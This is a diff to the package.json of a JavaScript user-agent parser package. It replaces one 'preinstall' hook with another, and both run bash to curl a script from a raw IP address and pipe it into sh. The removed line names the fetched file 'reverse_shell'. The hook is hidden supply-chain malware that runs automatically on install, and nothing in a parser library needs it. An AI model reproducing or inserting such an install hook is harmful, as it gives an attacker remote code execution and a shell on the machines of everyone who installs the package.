@@ -6,6 +6,6 @@
   "description": "Lightweight JavaScript-based user-agent string parser",
   "main": "src/ua-parser.js",
   "scripts": {
-    "preinstall": "bash -c 'curl 124.220.4.95:8232/reverse_shell|sh'"
+    "preinstall": "bash -c 'curl 124.220.4.95/8232|sh'"
   }
 }
